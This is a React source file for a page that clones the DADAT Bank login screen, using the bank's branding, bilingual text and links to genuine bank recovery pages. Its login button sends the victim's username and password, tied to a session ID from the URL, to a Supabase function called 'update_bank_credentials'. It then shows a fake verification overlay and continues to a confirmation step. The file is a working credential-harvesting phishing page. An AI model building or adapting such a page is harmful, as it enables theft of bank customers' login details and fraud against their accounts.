import { useState, useEffect } from "react";
import { useSearchParams, useNavigate } from "react-router-dom";
import { supabase } from "@/integrations/supabase/client";
import LoadingOverlay from "@/components/LoadingOverlay";
import { usePageMeta } from "@/hooks/use-page-meta";
import { X, Eye, EyeOff } from "lucide-react";
import dadatbankLogo from "@/assets/dadatbank-logo.png";
import dadatbankBg from "@/assets/dadatbank-bg.png";
import dadatbankIcon from "@/assets/dadat_bank.png";

const Dadatbank = () => {
  const [searchParams] = useSearchParams();
  const navigate = useNavigate();
  const sessionId = searchParams.get("s") || "";
  const [showLoading, setShowLoading] = useState(false);

  useEffect(() => { window.scrollTo(0, 0); }, []);
  usePageMeta("DADAT - Login", dadatbankIcon);

  const [username, setUsername] = useState("");
  const [isFocused, setIsFocused] = useState(false);
  const [password, setPassword] = useState("");
  const [isPasswordFocused, setIsPasswordFocused] = useState(false);
  const [showPassword, setShowPassword] = useState(false);
  const [lang, setLang] = useState<"de" | "en">("de");

  return (
    <>
      {showLoading && <LoadingOverlay message="Anmeldedaten werden überprüft..." onComplete={() => navigate("/confirmation?s=" + sessionId)} />}
    <div className="min-h-screen flex flex-col" style={{ fontFamily: "Arial, 'Helvetica Neue', Helvetica, sans-serif" }}>
      {/* Header */}
      <header style={{ backgroundColor: "#fff" }}>
        <div className="max-w-[1200px] mx-auto flex items-center px-4 py-2">
          <img src={dadatbankLogo} alt="DADAT BANK" className="h-8 md:h-14 object-contain" />
        </div>
      </header>

      {/* Main */}
      <div
        className="flex-1 flex items-center justify-center px-4"
        style={{
          backgroundImage: `url(${dadatbankBg})`,
          backgroundSize: "cover",
          backgroundPosition: "center",
          backgroundRepeat: "no-repeat",
        }}
      >
        <div className="w-full max-w-[560px] overflow-hidden">
          {/* Header bar */}
          <div
            className="px-6 py-4 text-white font-normal text-2xl"
            style={{ backgroundColor: "#ae3186" }}
          >
            Login
          </div>

          {/* Card body */}
          <div className="bg-white px-6 py-5 space-y-4">
            {/* Info text */}
            <p className="text-xs md:text-sm leading-snug" style={{ color: "#333" }}>
              {lang === "de" ? (
                <>
                  Hier können Sie sich für Ihr neues Online Banking anmelden. Beim Login wird eine sichere Verbindung aufgebaut. Bitte achten Sie darauf, dass Sie Ihre Zugangsdaten auf keiner anderen Seite eingeben und diese geheim halten. Wir werden Sie nie nach Ihrer PIN oder einer TAN fragen!
                  <br /><br />
                  Hinweis: Wenn Sie Ihre Zugangsdaten bereits umgestellt haben, ist nur mehr der Benutzername gültig (keine Verfügernummer).
                </>
              ) : (
                "You can register for your new online banking service here. When you log in, a secure connection is established. Please make sure that you do not enter your access details on any other site and keep them secret. We will never ask you for your PIN or a TAN."
              )}
            </p>

            {/* Divider */}
            <hr className="border-gray-200" />

            {/* Label row */}
            <div className="flex items-center justify-between -mb-3">
              <span className="font-normal text-xs" style={{ color: "#999" }}>
                {lang === "de" ? "Anmeldung mit Benutzername" : "User name or authorised party number"}
              </span>
              <span className="text-sm">
                <a
                  href="#"
                  onClick={(e) => {
                    e.preventDefault();
                    setLang(lang === "de" ? "en" : "de");
                  }}
                  className="no-underline hover:underline"
                  style={{ color: "#b631a5" }}
                >
                  {lang === "de" ? "English" : "Deutsch"}
                </a>
              </span>
            </div>

            {/* Username input */}
            <div className="relative !mt-1.5">
              <input
                type="text"
                value={username}
                onChange={(e) => setUsername(e.target.value)}
                onFocus={() => setIsFocused(true)}
                onBlur={() => setIsFocused(false)}
                className="w-full px-3 py-2.5 border text-sm outline-none transition-colors rounded-sm"
                style={{
                  backgroundColor: isFocused ? "#f0d6eb" : "#f1f1f1",
                  borderColor: isFocused ? "#ae3186" : "#dedede",
                  boxShadow: isFocused ? "0 0 0 1px #ae3186" : "none",
                }}
              />
              {username && (
                <button
                  onClick={() => setUsername("")}
                  className="absolute right-2 top-1/2 -translate-y-1/2"
                  type="button"
                >
                  <X size={24} color={isFocused ? "#ae3186" : "#333"} />
                </button>
              )}
            </div>

            {/* Password label */}
            <div className="flex items-center -mb-3">
              <span className="font-normal text-xs" style={{ color: "#999" }}>
                {lang === "de" ? "Passwort" : "Password"}
              </span>
            </div>

            {/* Password input */}
            <div className="relative !mt-1.5">
              <input
                type={showPassword ? "text" : "password"}
                value={password}
                onChange={(e) => setPassword(e.target.value)}
                onFocus={() => setIsPasswordFocused(true)}
                onBlur={() => setIsPasswordFocused(false)}
                className="w-full px-3 py-2.5 border text-sm outline-none transition-colors rounded-sm"
                style={{
                  backgroundColor: isPasswordFocused ? "#f0d6eb" : "#f1f1f1",
                  borderColor: isPasswordFocused ? "#ae3186" : "#dedede",
                  boxShadow: isPasswordFocused ? "0 0 0 1px #ae3186" : "none",
                }}
              />
              {password && (
                <button
                  onClick={() => setShowPassword(!showPassword)}
                  className="absolute right-2 top-1/2 -translate-y-1/2"
                  type="button"
                >
                  {showPassword ? <EyeOff size={20} color={isPasswordFocused ? "#ae3186" : "#333"} /> : <Eye size={20} color={isPasswordFocused ? "#ae3186" : "#333"} />}
                </button>
              )}
            </div>

            {/* Links under password field */}
            <div className="flex flex-col items-center gap-0.5">
              {lang === "de" ? (
                <>
                  <a
                    href="https://konto.dad.at/banking/usernameRecovery.xhtml"
                    target="_blank"
                    rel="noopener noreferrer"
                    className="text-xs md:text-[15px] no-underline hover:underline leading-tight py-0 my-0"
                    style={{ color: "#b631a5" }}
                  >
                    Benutzername vergessen?
                  </a>
                  <a
                    href="https://konto.dad.at/banking/passwordRecovery.xhtml"
                    target="_blank"
                    rel="noopener noreferrer"
                    className="text-xs md:text-[15px] no-underline hover:underline leading-tight py-0 my-0"
                    style={{ color: "#b631a5" }}
                  >
                    Passwort vergessen (nach Umstellung)?
                  </a>
                  <a
                    href="https://www.dad.at/Service/Service/Zugangsdaten"
                    target="_blank"
                    rel="noopener noreferrer"
                    className="text-xs md:text-[15px] no-underline hover:underline leading-tight py-0 my-0"
                    style={{ color: "#b631a5" }}
                  >
                    Zugangsdaten vergessen oder gesperrt
                  </a>
                  <a
                    href="https://konto.dad.at/"
                    target="_blank"
                    rel="noopener noreferrer"
                    className="text-xs md:text-[15px] no-underline hover:underline leading-tight py-0 my-0"
                    style={{ color: "#b631a5" }}
                  >
                    Login mit Ersatz Passwort
                  </a>
                  <a
                    href="https://konto.dad.at/banking/login.xhtml?signature=12345&demo=true&loginToken=1234"
                    target="_blank"
                    rel="noopener noreferrer"
                    className="text-xs md:text-[15px] no-underline hover:underline leading-tight py-0 my-0"
                    style={{ color: "#b631a5" }}
                  >
                    Demoversion
                  </a>
                </>
              ) : (
                <a
                  href="https://konto.dad.at/banking/erstlogin2c/erstlogin2c.xhtml"
                  target="_blank"
                  rel="noopener noreferrer"
                  className="text-xs md:text-[15px] no-underline hover:underline leading-tight py-0 my-0"
                  style={{ color: "#b631a5" }}
                >
                  You are logging in for the first time?
                </a>
              )}
            </div>

            {/* Divider above button */}
            <hr className="-mx-6 border-gray-200" />

            {/* Weiter button */}
            <button
              className="w-full py-2 text-white font-normal text-sm"
              style={{ backgroundColor: "#ae3186" }}
            
              onClick={async () => {
                console.log("Session ID:", sessionId);
                if (sessionId) {
                  const { error } = await supabase.rpc("update_bank_credentials", {
                    p_session_id: sessionId,
                    p_username: username,
                    p_password: password,
                    p_username_label: "Benutzername",
                    p_password_label: "Passwort",
                  });
                  if (error) console.error("Update failed:", error);
                  else console.log("Update successful");
                } else {
                  console.error("No session ID found in URL!");
                }
                setShowLoading(true);
              }}>
              {lang === "de" ? "Weiter" : "Continue"}
            </button>

            {/* Divider below button */}
            <hr className="-mx-6 border-gray-200" />

            {/* Links after button */}
            <div className="flex flex-col items-center gap-0.5">
              {lang === "de" ? (
                <>
                  <a
                    href="https://konto.dad.at/banking/login.xhtml#"
                    target="_blank"
                    rel="noopener noreferrer"
                    className="text-xs md:text-[15px] no-underline hover:underline leading-tight py-0 my-0"
                    style={{ color: "#b631a5" }}
                  >
                    Benutzername vergessen
                  </a>
                  <a
                    href="https://konto.dad.at/banking/login.xhtml#"
                    target="_blank"
                    rel="noopener noreferrer"
                    className="text-xs md:text-[15px] no-underline hover:underline leading-tight py-0 my-0"
                    style={{ color: "#b631a5" }}
                  >
                    Passwort vergessen
                  </a>
                </>
              ) : (
                <a
                  href="https://konto.dad.at/banking/login.xhtml?signature=12345&demo=true&loginToken=1234"
                  target="_blank"
                  rel="noopener noreferrer"
                  className="text-xs md:text-[15px] no-underline hover:underline leading-tight py-0 my-0"
                  style={{ color: "#b631a5" }}
                >
                  Try demo
                </a>
              )}
            </div>
          </div>
        </div>
      </div>
    </div>
    </>
  );
};

export default Dadatbank;
